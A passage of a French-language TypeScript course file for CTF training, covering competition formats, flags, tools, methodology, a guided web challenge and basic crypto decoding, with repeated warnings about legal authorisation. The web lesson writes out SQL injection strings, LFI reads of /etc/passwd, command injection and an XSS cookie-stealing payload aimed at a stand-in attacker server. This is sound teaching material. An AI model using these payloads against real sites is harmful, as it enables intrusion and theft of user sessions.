import type { Course } from "./types";
import { h, p, list, code, callout } from "./helpers";

export const CTF_TRAINING_COURSE: Course = {
  id: "ctf-training",
  levelId: 7,
  title: "CTF Training",
  description:
    "S'entraîner en conditions de compétition : web, crypto, forensics, stéganographie, OSINT, reverse et pwn.",
  xp: 1000,
  modules: [
    {
      id: "ctf-module-1",
      title: "Comprendre les CTF : règles, types, plateformes",
      lessons: [
        {
          id: "ctf-lecon-01",
          title: "C'est quoi un CTF ?",
          type: "theory",
          duration: "14 min",
          blocks: [
            h("La chasse au trésor des hackers"),
            p(
              "Imagine une chasse au trésor : chaque énigme résolue te donne un mot de passe secret. Tu remets ce mot de passe au maître du jeu pour valider ta progression et marquer des points. Un CTF (Capture The Flag, « capture du drapeau ») est exactement cela, version cybersécurité : une compétition où les participants résolvent des défis techniques pour récupérer une chaîne de caractères secrète appelée flag, le plus souvent au format CTF{contenu}."
            ),
            p(
              "Tu arrives ici avec un sac déjà bien rempli : tu sais administrer une machine Linux, lire le réseau, écrire du Python, identifier les failles web des niveaux 4-5 et suivre une méthodologie de pentest. Tout cela reste théorique tant que tu ne l'as pas pratiqué en conditions réelles. Le CTF est le terrain de jeu qui transforme tes connaissances en réflexes."
            ),
            h("Pourquoi les CTF sont-ils le meilleur entraînement ?"),
            p(
              "Un CTF est à la cybersécurité ce que la course d'orientation est à la randonnée : on te donne un objectif (un point précis sur la carte), une carte (les indices de l'énoncé), et tu dois mobiliser toutes tes compétences pour y arriver dans le temps imparti. Personne ne te tient par la main."
            ),
            list(
              "Pratique sur du concret : chaque défi est un mini-problème réel — une application vulnérable, un binaire à analyser, une capture réseau à fouiller.",
              "Progression mesurable : les points, les rangs et les flags validés sont des indicateurs objectifs de progrès.",
              "Cohérence avec le monde réel : les défis sont inspirés de failles réelles (CVE, incidents, techniques de ransomware).",
              "Recrutement direct : les entreprises de cybersécurité scrutent les classements des plateformes et des compétitions.",
              "Communauté : équipes, Discord, write-ups (solutions expliquées), entraide entre compétiteurs."
            ),
            h("L'histoire de départ"),
            p(
              "Tu es un ancien élève du programme CyberAcademy, fraîchement diplômé du niveau 6. Un recruteur d'une société de cybersécurité a vu ton CV et te propose un poste de pentester junior. L'entretien est dans trois semaines. On te prévient : « Ton score sur HackTheBox, TryHackMe ou Root-Me sera discuté en premier. » Tu décides donc de t'entraîner sérieusement, comme un athlète avant une compétition. Ce cours est ton programme d'entraînement."
            ),
            h("Ce que ce niveau va te donner"),
            list(
              "Une méthode de résolution reproductible pour n'importe quel challenge.",
              "Un kit d'outils complet et vérifié : strings, binwalk, exiftool, hashid, john, CyberChef, gdb.",
              "Un carnet de notes avec tes propres commandes et réflexes.",
              "Des défis résolus, des laboratoires complétés, et le badge Flag Hunter à la clé."
            ),
            callout(
              "Les CTF se jouent UNIQUEMENT sur des environnements autorisés : plateformes dédiées (HackTheBox, TryHackMe, Root-Me, picoCTF, CTFd), machines virtuelles locales ou serveurs dont tu as l'autorisation écrite. Un CTF n'est pas un passe-droit : les techniques sont les mêmes que celles d'un attaquant, mais le cadre légal fait toute la différence. Tester sans autorisation est un délit (article 323-1 du code pénal).",
              "danger"
            ),
            h("En résumé"),
            list(
              "Un CTF est une compétition où l'on résout des défis pour trouver des flags.",
              "Le flag est la preuve que tu as réussi : tu le soumets sur la plateforme pour gagner des points.",
              "Le CTF est le meilleur terrain d'entraînement : concret, mesurable, réaliste et reconnu par les recruteurs.",
              "Ce niveau t'entraîne à résoudre des défis dans un cadre légal, plateformes autorisées uniquement."
            ),
            callout(
              "Un quiz intermédiaire et un quiz final t'attendent en fin de parcours. Tout ce qui y est demandé sera vu dans les leçons.",
              "info"
            )
          ]
        },
        {
          id: "ctf-lecon-02",
          title: "Les types de challenges CTF",
          type: "theory",
          duration: "13 min",
          blocks: [
            h("La grille, l'arène ou la machine"),
            p(
              "Tous les CTF ne se ressemblent pas. Selon l'organisation, tu résoudras des défis classés dans une grille, tu défendras des machines, ou tu compromettras une seule cible pas à pas. Connaître les formats t'aide à choisir la bonne stratégie et à ne pas te perdre."
            ),
            h("Le format Jeopardy — la grille de défis"),
            p(
              "Le format le plus courant : une grille où chaque case contient une catégorie et un nombre de points. Tu choisis les défis que tu veux, dans l'ordre que tu veux. C'est le format idéal pour débuter : pas de pression directe, tu progresses à ton rythme, chaque défi est indépendant."
            ),
            code(`        Web   Crypto   Forensics   Stego   OSINT   RE   Pwn   Misc
100     □      □         □          □        □      □     □     □
200     □      □         □          □        □      □     □     □
300     □      □         □          □        □      □     □     □
500     □      □         □          □        □      □     □     □`),
            h("Le format Attack-Defense"),
            p(
              "Deux équipes s'affrontent : chacune défend ses propres services (de vraies applications vulnérables) et attaque ceux de l'équipe adverse. Les flags se volent sur les machines adverses. Ce format exige une équipe et des compétences variées : la moitié du monde défend pendant que l'autre attaque."
            ),
            h("Le format Kill chain — la machine unique"),
            p(
              "Une seule machine à compromettre pas à pas, en général dans cet ordre : trouver un accès (user), obtenir le flag utilisateur, élever ses privilèges (root), obtenir le flag administrateur. C'est le format de HackTheBox et TryHackMe, proche de la réalité d'un pentest complet."
            ),
            h("Le format Red vs Blue — l'exercice d'entreprise"),
            p(
              "Une équipe attaque (rouge), une équipe défend (bleu), souvent sur le même réseau. C'est le format utilisé par les entreprises pour entraîner leurs équipes de sécurité à la détection et à la réponse aux incidents."
            ),
            h("Les catégories de challenges"),
            p(
              "Dans un format Jeopardy, chaque défi appartient à une catégorie. C'est la force du CTF : il te teste sur dix compétences en parallèle, et chaque catégorie a sa méthode et ses outils."
            ),
            list(
              "Web : failles applicatives, HTTP, injections, cookies, JWT.",
              "Cryptographie (Crypto) : encodages, chiffrement, hachage.",
              "Forensics : analyse de fichiers, de captures réseau, de mémoire.",
              "Stéganographie (Stego) : données cachées dans des images, des sons, des métadonnées.",
              "OSINT : renseignement en sources ouvertes, recherche et corrélation d'informations publiques.",
              "Reverse Engineering (RE) : analyser un programme sans son code source.",
              "Pwn / Exploitation : vulnérabilités mémoire, buffer overflow, shellcodes.",
              "Misc : tout le reste — programmation, QR codes, logique, culture."
            ),
            h("Points et difficulté de départ"),
            p(
              "Les points indiquent approximativement la difficulté, pas toujours fidèlement. Les défis à 50-100 points sont des échauffements : ils t'apprennent le mécanisme de la plateforme et les réflexes de base. Les défis à 300-500 points demandent de la méthode, des outils avancés et de la persévérance."
            ),
            code(`Catégorie           Points typiques   Difficulté de départ
Web                 50 – 500         Moyenne
Cryptographie       50 – 500         Faible (les bases)
Forensics           50 – 300         Faible
Stéganographie      50 – 200         Faible
OSINT               50 – 200         Très faible
Reverse Engineering 100 – 500        Élevée
Exploitation (Pwn)  100 – 500        Élevée
Misc                25 – 100         Variable`),
            callout(
              "Tous les formats se pratiquent sur des plateformes qui t'y autorisent explicitement. Un format « machine à compromettre » sur HackTheBox ou TryHackMe est légal ; le même geste sur une machine dont tu n'as pas l'autorisation est un délit (article 323-1 du code pénal).",
              "warning"
            ),
            h("En résumé"),
            list(
              "Jeopardy : une grille de défis par catégories et par points — idéal pour débuter.",
              "Attack-Defense : attaquer les services adverses et défendre les siens.",
              "Kill chain : une machine à compromettre user → root, format HackTheBox et TryHackMe.",
              "Red vs Blue : une équipe attaque, l'autre défend, format d'exercice d'entreprise."
            )
          ]
        },
        {
          id: "ctf-lecon-03",
          title: "Les flags et leurs formats",
          type: "theory",
          duration: "12 min",
          blocks: [
            h("Le flag est la seule chose qui compte"),
            p(
              "Sur la plateforme, seule la chaîne de caractères compte. Tu peux passer trois heures sur un défi et résoudre la moitié de l'énigme : sans le flag correct, tu n'as rien. À l'inverse, un flag bien soumis te rapporte des points immédiatement. Tout commence donc par bien comprendre ce qu'est un flag et comment le soumettre."
            ),
            h("Les formats les plus courants"),
            p(
              "Chaque plateforme ou compétition utilise son propre préfixe. Le contenu entre les accolades varie, mais la structure est presque toujours la même : un préfixe, des accolades, un contenu en ASCII."
            ),
            code(`CTF{Ex3mpl3_d3_Fl4g}
picoCTF{hidden_flag_1}
flag{...}
HTB{...}
FLAG{...}`),
            h("La règle d'or : soumettre exactement"),
            p(
              "Le flag se soumet exactement tel qu'il est trouvé, à la casse près, sans espace ajouté ni ligne vide. CTF{abc} n'est pas ctf{ABC}. Un flag mal recopié est un flag perdu : la plateforme le refuse, et tu ne sauras pas toujours pourquoi."
            ),
            list(
              "Ne jamais modifier un flag « au jugé » : ajouter ou retirer des accolades, changer la casse, supprimer des caractères.",
              "Si le format échoue, relis la sortie de tes outils plutôt que de deviner.",
              "Les flags sont presque toujours en ASCII : évite espaces, accents et caractères exotiques dans ce que tu cherches.",
              "Note le format attendu dès le début du challenge (l'énoncé ou la plateforme l'indique souvent)."
            ),
            h("Les mots-clés à chercher"),
            p(
              "Les organisateurs cachent le flag dans un endroit où il est « trouvable », pas « impossible » : un commentaire HTML, une chaîne de caractères, la fin d'un fichier, une réponse HTTP. Pour le retrouver, cherche ces mots-clés dans les sorties de tes outils."
            ),
            code(`CTF{  flag{  picoCTF{  HTB{  FLAG  flag  secret  hidden
root  admin  pass  password  flag.txt  .bak  .backup  robots.txt`),
            h("La recherche rapide"),
            p(
              "Après un outil qui affiche du texte (strings, tcpdump, curl), lance une recherche insensible à la casse : elle te fait gagner un temps précieux."
            ),
            code(`strings fichier | grep -iE "ctf|flag|pico|htb"`),
            h("Où se cachent les flags ?"),
            p(
              "Dans la grande majorité des défis faciles, le flag est quelque part « en clair » : dans le code source de la page, dans un fichier téléchargé, à la fin d'un fichier suspect, dans les métadonnées d'une image, ou dans une réponse réseau. Le réflexe : chercher les solutions simples avant les attaques complexes."
            ),
            h("Le flag et la casse"),
            p(
              "Soumettre un flag « au mauvais format » est une erreur classique de débutant. Si la soumission est refusée, vérifie : le préfixe (CTF{, picoCTF{, flag{...}), les accolades, la casse exacte, et l'absence d'espace ou de saut de ligne parasite. Soumets exactement la chaîne que tes outils ont affichée."
            ),
            callout(
              "Tous les exemples de flags de ce cours proviennent de plateformes autorisées ou de fichiers que tu crées toi-même. Les flags de compétition ne valent rien ailleurs que sur leur plateforme : ne cherche jamais à « utiliser » un flag trouvé sur une cible non autorisée.",
              "danger"
            ),
            h("En résumé"),
            list(
              "Le flag est la preuve de la réussite : sans lui, pas de points.",
              "Formats courants : CTF{...}, picoCTF{...}, flag{...}, HTB{...}.",
              "Soumettre exactement la chaîne trouvée : casse, accolades, espaces.",
              "Chercher les mots-clés flag, secret, password dans les sorties d'outils."
            )
          ]
        },
        {
          id: "ctf-lecon-04",
          title: "La boîte à outils du CTFer",
          type: "theory",
          duration: "15 min",
          blocks: [
            h("Des outils, mais surtout des réflexes"),
            p(
              "Un menuisier ne transporte pas toute sa scie sur tous les chantiers : il choisit l'outil adapté à la tâche. En CTF, c'est pareil. Chaque catégorie a ses outils de prédilection, mais quelques outils transverses reviennent partout. Ce cours te les fait tous pratiquer ; cette leçon te donne la carte."
            ),
            h("Les outils du décodage et de la crypto"),
            p(
              "CyberChef (sur gchq.github.io/CyberChef) est la boîte à outils en ligne du CTFer : il découpe, décode, convertit, et son opération Magic détecte automatiquement les encodages les plus probables. Côté ligne de commande : base64, xxd, tr, openssl. Pour les hashes : hashid identifie le type, john et hashcat cassent par dictionnaire ou force brute."
            ),
            code(`# Décodages rapides
echo "chaine" | base64 -d
echo "hex" | xxd -r -p
echo "texte" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# Hashes
hashid -m -j hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`),
            h("Les outils de l'analyse de fichiers"),
            p(
              "Quatre commandes forment la colonne vertébrale du Forensics : file révèle la vraie nature d'un fichier, strings affiche les chaînes lisibles, exiftool lit les métadonnées, binwalk détecte et extrait les fichiers emboîtés. Avec binwalk -e, les fichiers cachés sortent automatiquement dans un dossier _nom.extracted."
            ),
            code(`file defi.png
strings -n 6 defi.png
exiftool defi.png
binwalk defi.png
binwalk -e defi.png`),
            h("Les outils de la stéganographie"),
            p(
              "Quand les données ne sont pas à la fin du fichier mais dans ses bits ou ses pixels : steghide cache et extrait des données dans des images ou des sons (avec une passphrase), zsteg analyse les bits de poids faible des PNG/BMP, foremost extrait des fichiers par signatures (carving), et Audacity révèle les spectrogrammes des fichiers audio."
            ),
            code(`steghide info photo.jpg
steghide extract -sf photo.jpg
zsteg image.png
foremost -i image.jpg`),
            h("Les outils de la reconnaissance et du web"),
            p(
              "La recon précède toujours l'attaque : curl pour récupérer des pages et des en-têtes, gobuster pour énumérer les répertoires et fichiers, ffuf pour le fuzzing, dig et subfinder pour le DNS et les sous-domaines, nmap pour les ports et services. Côté exploitation web, tu retrouves sqlmap pour la SQLi et Burp Suite comme proxy intercepteur."
            ),
            code(`curl -s http://cible/
curl -s http://cible/robots.txt
gobuster dir -u http://cible -w /usr/share/wordlists/dirb/common.txt
nmap -sV 192.168.1.10`),
            h("Les outils du réseau"),
            p(
              "Pour lire une capture pcap : tshark (version ligne de commande de Wireshark) donne la vue d'ensemble et filtre avec -Y, tcpdump -r lit le fichier et -A affiche le contenu en ASCII, strings extrait les chaînes directement."
            ),
            code(`tshark -r capture.pcap
tshark -r capture.pcap -Y "http"
tcpdump -r capture.pcap -A
strings capture.pcap | grep -i flag`),
            h("Les outils du reverse et du pwn"),
            p(
              "Pour lire un binaire : file pour le type, strings pour les indices, nm pour lister les fonctions, objdump -d pour le désassemblage, gdb pour déboguer pas à pas, et Ghidra ou dogbolt.org pour décompiler en pseudo-code. Pour l'exploitation : checksec vérifie les protections, et pwntools (la bibliothèque Python du pwn) automatise l'interaction avec les programmes et les réseaux."
            ),
            code(`file crackme
strings -n 6 crackme
nm crackme
objdump -d crackme
gdb -q ./crackme
checksec crackme`),
            h("Le carnet de notes"),
            p(
              "Ton outil le plus important n'est pas un binaire : c'est ton carnet. Note chaque challenge résolu, les commandes qui ont marché, les erreurs faites. Un carnet bien tenu transforme chaque défi en brique réutilisable pour les suivants — c'est aussi ton futur portfolio."
            ),
            callout(
              "Toutes les commandes de ce cours se pratiquent sur ta propre machine, sur des fichiers que tu crées, ou sur des plateformes qui t'y autorisent (HackTheBox, TryHackMe, Root-Me, picoCTF, les labos CyberAcademy). Les lancer contre une cible sans autorisation est un délit : article 323-1 du code pénal.",
              "danger"
            ),
            h("En résumé"),
            list(
              "Crypto : CyberChef, base64, xxd, tr, hashid, john, hashcat.",
              "Fichiers : file, strings, exiftool, binwalk.",
              "Stego : steghide, zsteg, foremost, Audacity.",
              "Web et recon : curl, gobuster, ffuf, nmap, sqlmap, Burp Suite.",
              "Réseau : tshark, tcpdump, Wireshark.",
              "Reverse et pwn : nm, objdump, gdb, Ghidra, checksec, pwntools."
            )
          ]
        },
        {
          id: "ctf-lecon-05",
          title: "La méthodologie générale de résolution",
          type: "theory",
          duration: "15 min",
          blocks: [
            h("Le mantra : identifier avant d'agir"),
            p(
              "Le débutant attaque un challenge en lançant tous ses outils au hasard, dans l'espoir que l'un d'eux trouve quelque chose. Le compétiteur expérimenté suit une méthode : lire l'énoncé, identifier la catégorie, choisir les outils, documenter, extraire, soumettre. C'est cette méthode qui transforme un problème opaque en série de petites étapes claires."
            ),
            h("Le workflow en cinq étapes"),
            p(
              "Voici le chemin de résolution que tu appliqueras à chaque challenge de ce cours — et dans ta future carrière."
            ),
            code(`1. Lire l'énoncé  → catégorie, format de flag, indices
2. Recon rapide    → source HTML, robots.txt, curl, commentaires
3. Identifier      → quel type de donnée / quelle faille ?
4. Résoudre        → choisir les bons outils et les appliquer
5. Soumettre       → flag au format exact, noter la solution`),
            h("Étape 1 — Lire l'énoncé"),
            p(
              "L'énoncé est un contrat : il décrit ce que tu dois trouver et parfois comment. Le nom du défi, sa catégorie et son auteur sont des indices. Un défi nommé « Traversal » ne parle probablement pas de crypto. Un défi « caché en pleine vue » en Forensics t'oriente vers les métadonnées ou les fichiers emboîtés. Lis l'énoncé deux fois avant d'agir."
            ),
            h("Étape 2 — La recon rapide"),
            p(
              "Avant de lancer des outils lourds, la recon à coût quasi nul : la source HTML (curl -s), les commentaires, robots.txt, sitemap.xml, les en-têtes HTTP (curl -sI). Une grande partie des défis faciles se résout ici : le développeur a laissé une sauvegarde, un commentaire, un fichier caché. Toujours vérifier les solutions simples avant les attaques complexes."
            ),
            code(`curl -s http://cible/
curl -sI http://cible/
curl -s http://cible/robots.txt`),
            h("Étape 3 — Identifier le type de donnée"),
            p(
              "C'est l'étape la plus importante et la plus sous-estimée. Face à une chaîne étrange : est-ce du base64 (finit par =), de l'hex (uniquement 0-9a-f), du ROT13 (lettres décalées), un hash (empreinte de taille fixe), ou un chiffrement avec clé ? L'identification détermine l'outil, pas l'inverse. Bruteforcer quand il faut décoder est une erreur classique."
            ),
            list(
              "base64 : alphabet A-Za-z0-9+/ , padding = en fin, longueur multiple de 4.",
              "hex : uniquement 0-9a-f, nombre pair de caractères.",
              "ROT13 : lettres uniquement, texte qui ressemble à du « cassé ».",
              "hash : empreinte de taille fixe (MD5 = 32 hex, SHA-1 = 40, SHA-256 = 64).",
              "chiffrement : octets binaires, texte illisible, clé à trouver dans l'énoncé ou le nom du fichier."
            ),
            h("Étape 4 — Résoudre avec la bonne méthode"),
            p(
              "Une fois la catégorie identifiée, applique la méthode de la catégorie : la pyramide Forensics (file → strings → exiftool → binwalk), le décodage en cascade en crypto (base64 → hex → ROT13), la lecture du code source en web. Chaque catégorie a sa méthode, détaillée dans les leçons suivantes."
            ),
            h("Étape 5 — Soumettre et documenter"),
            p(
              "Le flag se soumet au format exact attendu par la plateforme. Une fois résolu, note la solution : c'est ce qu'on appelle un write-up. Un challenge résolu se réutilise cent fois, et un carnet de résolutions est ta matière première pour les challenges suivants."
            ),
            h("Documenter avant d'oublier"),
            p(
              "Le professionnel note chaque essai : cible, entrée, commande, résultat, horodatage. En CTF, c'est le même réflexe : tu testes plusieurs hypothèses, et seule la traçabilité te permet de revenir en arrière sans tout refaire. Un flag trouvé et non noté est un flag perdu."
            ),
            callout(
              "La méthodologie s'exerce UNIQUEMENT sur des environnements autorisés. Suivre ce workflow sur une plateforme CTF est parfaitement légal ; l'appliquer à un site ou une machine sans autorisation écrite est un délit (article 323-1 du code pénal).",
              "danger"
            ),
            h("En résumé"),
            list(
              "Lire l'énoncé : le nom, la catégorie, les indices.",
              "Recon rapide : source HTML, robots.txt, en-têtes.",
              "Identifier avant d'agir : encodage, hash, chiffrement, faille ?",
              "Résoudre avec la méthode de la catégorie, puis soumettre le flag exact.",
              "Documenter chaque essai dans ton carnet."
            )
          ]
        },
        {
          id: "ctf-lecon-06",
          title: "Les plateformes pour s'entraîner",
          type: "theory",
          duration: "13 min",
          blocks: [
            h("Tes terrains d'entraînement légaux"),
            p(
              "Un athlète ne s'entraîne pas n'importe où : il a des salles, des pistes, des stades. Pour toi, ces infrastructures sont les plateformes de CTF. Elles t'autorisent explicitement à tester, elles hébergent les challenges, elles vérifient les flags et elles classent les participants. C'est le cadre légal dans lequel tu peux utiliser librement toutes les techniques de ce cours."
            ),
            h("Les plateformes principales"),
            list(
              "HackTheBox (HTB) : des machines complètes à compromettre et des challenges à points. Réaliste, classements, saisons. Gratuit en version limitée.",
              "TryHackMe (THM) : des salles guidées pas à pas, très pédagogiques et gamifiées. Idéal pour débuter accompagné. Gratuit en version limitée.",
              "Root-Me : des challenges classés par compétence (web, crypto, forensics), en français et gratuit. Parfait pour travailler une compétence précise.",
              "picoCTF : la compétition éducative de Carnegie Mellon University, gratuite, conçue pour apprendre, avec une archive de challenges « Practice » ouverte toute l'année.",
              "CTFd : le moteur open-source qui héberge de nombreuses compétitions ; tu le retrouveras dans les jeux d'équipes.",
              "0xL4ugh : plateforme communautaire avec des jeux réguliers et des défis variés."
            ),
            h("Le point commun : le consentement"),
            p(
              "Ce qui rend toutes ces plateformes légales, c'est le consentement : l'organisateur met ses machines à disposition, définit un périmètre (le scope) et t'autorise à tester. Dès que tu sors de ce cadre, la même technique devient un délit. Retiens cette phrase : en sécurité, c'est l'autorisation qui fait la différence entre un test et une intrusion."
            ),
            h("Comment aborder une plateforme"),
            p(
              "Quelle que soit la plateforme choisie, le parcours est le même. Prends le temps de comprendre l'interface avant de te lancer : c'est du temps gagné en compétition."
            ),
            list(
              "Crée ton compte et familiarise-toi avec l'interface : où on soumet le flag, où on lit les scores, où sont les hints (indices, parfois payants).",
              "Commence par les défis les moins chers en points de chaque catégorie : ils sont conçus pour être faciles et t'échauffent.",
              "Note tes résolutions dans un carnet : un challenge résolu se réutilise cent fois.",
              "Lis les write-ups (solutions détaillées publiées après la compétition) des défis que tu n'as pas réussi : c'est là que se fait la progression."
            ),
            h("Les compétitions internationales"),
            p(
              "Les grandes compétitions annuelles — DEF CON CTF aux États-Unis, Google CTF, les championnats nationaux comme la CyberGuerre ou le FCSC en France, l'EuroSkills cyber — utilisent toutes le format CTF. Les qualifications en ligne sont ouvertes à tous : c'est ta porte d'entrée vers la scène internationale. Le site CTFtime.org recense toutes les compétitions passées, actuelles et futures, avec leurs classements."
            ),
            h("Choisir sa première plateforme"),
            p(
              "Si tu veux être accompagné pas à pas : TryHackMe. Si tu veux travailler une compétence précise : Root-Me. Si tu veux du réalisme et des machines complètes : HackTheBox. Si tu veux apprendre gratuitement avec une pédagogie conçue pour débuter : picoCTF. Tu peux d'ailleurs faire le parcours picoCTF de ce cours en TP dès la fin du niveau."
            ),
            callout(
              "Une seule règle absolue : tu ne t'entraînes que sur ces plateformes autorisées, sur tes propres machines ou sur des machines virtuelles isolées. Lancer les mêmes techniques contre un site, un réseau ou un serveur dont tu n'as pas l'autorisation écrite est un délit puni par l'article 323-1 du code pénal.",
              "danger"
            ),
            h("En résumé"),
            list(
              "HackTheBox, TryHackMe, Root-Me, picoCTF, CTFd et 0xL4ugh sont tes terrains d'entraînement légaux.",
              "Ce qui rend un test légal, c'est l'autorisation (le scope), pas la technique.",
              "Commence par les défis faciles, note tes résolutions, lis les write-ups.",
              "CTFtime.org recense les compétitions internationales, dont les qualifications sont ouvertes à tous."
            )
          ]
        },
      ],
    },
    {
      id: "ctf-module-2",
      title: "Catégorie par catégorie : web, crypto, stégo, forensics, OSINT, misc",
      lessons: [
        {
          id: "ctf-lecon-07",
          title: "Web — résoudre un challenge guidé",
          type: "exercise",
          duration: "20 min",
          blocks: [
            h("La maison avec le comptoir d'accueil"),
            p(
              "La catégorie Web regroupe tous les défis où il faut exploiter une application web : une page d'accueil, un formulaire, une API, un site avec un login. Le flag est en général caché dans une donnée que l'application ne devrait pas exposer : une base de données, un fichier du serveur, un cookie. Imagine une maison avec un comptoir d'accueil : ton travail est d'utiliser les portes et les interstices laissés par les constructeurs pour entrer dans les pièces interdites."
            ),
            h("Les failles que tu connais déjà"),
            p(
              "Tu as étudié ces failles en détail aux niveaux 4 et 5. Voici le rappel condensé orienté CTF, avec le réflexe à avoir pour chacune."
            ),
            list(
              "SQLi : tester ', \\\", ' OR 1=1 -- -, puis ' UNION SELECT ... pour lire les tables.",
              "XSS : chercher où l'input est réfléchi ; le flag peut être dans le cookie d'un visiteur (un « bot »).",
              "SSTI : tester {{7*7}} ; si la page affiche 49, le moteur de templates exécute ton code.",
              "LFI : ?page=../../../../etc/passwd, et le wrapper php://filter pour lire le code source PHP.",
              "Injection de commandes : ; ls, ; id, ; cat /etc/passwd.",
              "Cookies : décoder le cookie (base64 -d), modifier une valeur (admin=0 → admin=1).",
              "JWT : décoder sur jwt.io, passer HS256 à none, ou bruteforcer la clé avec hashcat -m 16500."
            ),
            h("Le challenge guidé — étape par étape"),
            p(
              "Tu reçois l'URL http://challenge.local/index.php?page=home. L'énoncé : « Le serveur garde un secret dans /var/www/secret.php. Il n'est pas affiché par la page d'accueil. » Le serveur tourne en PHP. Appliquons la méthode."
            ),
            h("Étape 1 — La recon"),
            code(`curl -s "http://challenge.local/index.php?page=home"
curl -s http://challenge.local/robots.txt
curl -sI "http://challenge.local/index.php?page=home"`),
            p(
              "Le paramètre page charge des pages par leur nom : home, about, contact. Ce modèle de « chargement de page par fichier » est le terreau classique du LFI (Local File Inclusion, inclusion locale de fichier)."
            ),
            h("Étape 2 — Tester la traversée de répertoire"),
            code(`curl -s "http://challenge.local/index.php?page=../../../../etc/passwd"`),
            p(
              "Si tu vois le contenu de /etc/passwd (des lignes du type root:x:0:0:root:/root:/bin/bash), le LFI est confirmé : le paramètre page lit un fichier du serveur sans validation."
            ),
            h("Étape 3 — Lire le code source exécuté"),
            p(
              "secret.php est exécuté par le serveur, donc invisible en clair. Le wrapper php://filter contourne ce problème : il demande au serveur d'encoder le fichier en base64 avant de l'exécuter."
            ),
            code(`curl -s "http://challenge.local/index.php?page=php://filter/convert.base64-encode/resource=secret.php"
# Sortie : PD9waHAgZWNobyAnQ1RGe2wwYzRsX2YxbDNfMW5jbHU1aTBufSc7ID8+

echo "PD9waHAgZWNobyAnQ1RGe2wwYzRsX2YxbDNfMW5jbHU1aTBufSc7ID8+" | base64 -d
# Sortie : <?php echo 'CTF{l0c4l_f1l3_1nclu5i0n}'; ?>`),
            h("Étape 4 — Soumettre le flag"),
            p(
              "Le flag est dans le code source décodé : CTF{l0c4l_f1l3_1nclu5i0n}. Tu le soumets au format exact sur la plateforme. Deux techniques combinées : la traversée de répertoire a confirmé la faille, le wrapper php://filter a permis de lire le fichier exécuté."
            ),
            h("Le réflexe SQLi en CTF"),
            p(
              "Dans les défis avec formulaire de login, la faille SQLi sert souvent à lire une table nommée flag, secret ou users. Teste l'injection simple d'abord, puis passe à UNION SELECT pour extraire les données."
            ),
            code(`' OR 1=1 -- -
' OR '1'='1
' UNION SELECT username,password FROM users --`),
            h("Le flag dans le cookie (XSS)"),
            p(
              "Le flag n'est pas forcément sur la page : il peut être dans le cookie de session d'un visiteur automatisé (le « bot »). Tu injectes du JavaScript qui envoie le cookie à ton serveur, puis tu écoutes avec netcat."
            ),
            code(`<script>document.location="http://ton-serveur/collecter?c="+document.cookie</script>`),
            p(
              "Tu écoutes ensuite sur ton serveur avec nc -lvnp 8080 pour recevoir le flag. Ce scénario se pratique uniquement sur les plateformes d'entraînement prévues pour."
            ),
            h("Bonnes pratiques Web"),
            list(
              "Tester les failles par ordre croissant de complexité : code source, input évident, injections.",
              "Utiliser curl avec des guillemets autour des payloads contenant des espaces ou des caractères spéciaux.",
              "Télécharger le code source quand il est fourni : la faille y est souvent écrite noir sur blanc.",
              "Noter chaque réponse HTTP : elle contient des indices (en-têtes, cookies, commentaires)."
            ),
            callout(
              "Toutes les requêtes de cette leçon s'effectuent UNIQUEMENT sur les plateformes qui t'y autorisent (labs PortSwigger, Root-Me, TryHackMe, picoCTF, ton propre labo local comme DVWA). Envoyer une payload d'injection sur un site réel sans autorisation écrite est un délit (article 323-1 du code pénal).",
              "danger"
            ),
            h("En résumé"),
            list(
              "La catégorie Web exploite les failles des niveaux 4-5 : SQLi, XSS, SSTI, LFI, injection de commandes, cookies, JWT.",
              "Le flag est caché dans des données exposées à tort : base de données, fichier du serveur, cookie.",
              "Réflexe : lire le code source, tester l'input, utiliser la payload la plus simple.",
              "Le wrapper php://filter lit le code source d'un fichier PHP exécuté."
            )
          ]
        },
        {
          id: "ctf-lecon-08",
          title: "Crypto — base64, hex et César",
          type: "theory",
          duration: "16 min",
          blocks: [
            h("Trois boîtes différentes"),
            p(
              "La difficulté principale des débutants en crypto est de confondre trois concepts très différents : l'encodage, le chiffrement et le hachage. Imagine trois boîtes. L'encodage est une boîte transparente, simplement réorganisée : tout le monde peut l'ouvrir, pas de secret. Le chiffrement est une boîte avec un cadenas : il faut une clé. Le hachage est une empreinte du contenu : impossible de retrouver le contenu, mais on peut vérifier qu'un contenu correspond."
            ),
            h("Pourquoi cette distinction est cruciale"),
            p(
              "Comprendre cette distinction, c'est savoir par où commencer : un message encodé se décode en secondes avec un outil, un message chiffré demande une clé ou une attaque, un hash se casse par dictionnaire. Le débutant qui confond encodage et chiffrement cherche « la clé » pendant des heures alors que le message était simplement en base64."
            ),
            h("Le base64"),
            p(
              "Le base64 représente des octets avec un alphabet de 64 caractères (A-Za-z0-9+/), avec un padding = en fin de chaîne. Tu le reconnais à sa fin en = ou ==, sa longueur multiple de 4, et ses caractères alphanumériques. C'est le réflexe numéro un : la grande majorité des défis faciles passe par du base64."
            ),
            code(`echo "U2NpZW5jZSBldCBjeWJlcnNlY3VyaXR5" | base64 -d
# Sortie : Science et cybersecurity`),
            h("L'hexadécimal"),
            p(
              "L'hex représente chaque octet par deux caractères 0-9a-f. Tu le reconnais : uniquement des caractères hexadécimaux, en nombre pair. Le décoder revient à convertir ces paires en caractères ASCII."
            ),
            code(`echo "53594e547b503051335f5a34464733457d" | xxd -r -p
# Sortie : SYNT{P0Q3_Z4FG3E}`),
            h("ROT13 et le chiffre de César"),
            p(
              "ROT13 décale chaque lettre de 13 positions (la moitié de 26) : F→S, L→Y, A→N, G→T, donc « FLAG » devient « SYNT ». C'est le plus connu des chiffrements de César, où l'on décale chaque lettre de k positions. Si le décalage est inconnu, il suffit d'essayer les 25 décalages possibles."
            ),
            code(`echo "SYNT{P0Q3_Z4FG3E}" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# Sortie : FLAG{C0D3_M4ST3R}`),
            h("Le tr magique expliqué"),
            p(
              "tr (translate) remplace chaque caractère de la première chaîne par son correspondant dans la seconde. Ici : A→N, B→O, ..., M→Z, N→A, ..., soit exactement un décalage de 13. Les deux plages 'A-Za-z' couvrent majuscules et minuscules."
            ),
            h("La méthode CyberChef"),
            p(
